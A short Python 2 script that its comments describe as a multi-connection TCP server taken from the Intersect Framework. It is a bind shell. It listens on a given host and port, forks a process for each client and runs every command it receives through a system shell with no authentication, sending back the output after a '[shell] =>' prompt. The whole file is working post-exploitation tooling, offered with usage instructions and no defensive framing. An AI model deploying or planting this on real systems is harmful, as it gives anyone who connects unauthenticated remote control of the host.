#!/usr/bin/env python
##
# multi-connection tcp server
# stripped from Intersect Framework
##

import os, sys
import socket
import time
from subprocess import Popen,PIPE,STDOUT,call

def reaper():                              
    while activePID:                        
        pid,stat = os.waitpid(0, os.WNOHANG)     
        if not pid: break
        activePID.remove(pid)

def handler(connection):                                                 
    while True:                                     
        cmd = connection.recv(socksize)
        proc = Popen(cmd,
              shell=True,
             stdout=PIPE,
             stderr=PIPE,
              stdin=PIPE,
              )
        stdout, stderr = proc.communicate()
        if cmd.startswith('cd'):
            try:
                destination = cmd[3:].replace('\n','')
                if os.path.isdir(destination):
                    os.chdir(destination)
                    current = os.getcwd()
                    connection.send("[*] %s" % current)
                else:
                    connection.send("[!] Directory does not exist") 
            except IndexError:
                pass
        elif cmd == (":quit"):
            connection.close()
            os._exit(0)
            sys.exit(0)
        elif proc:
            connection.send( stdout )
            connection.send("[shell] => ")

    connection.close() 
    os._exit(0)


def accept():                                
    while 1:   
        global connection                                  
        connection, address = conn.accept()
        connection.send("[shell] => ")
        reaper()
        childPid = os.fork()
        if childPid == 0:
            handler(connection)
        else:
            activePID.append(childPid)

socksize = 4096
activePID = []
try:
    host, port = sys.argv[1], int(sys.argv[2])
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.bind((host, port))
    conn.listen(5)
    accept()
except:
    print("usage: ./multi.py <host> <port>")
    sys.exit(1)

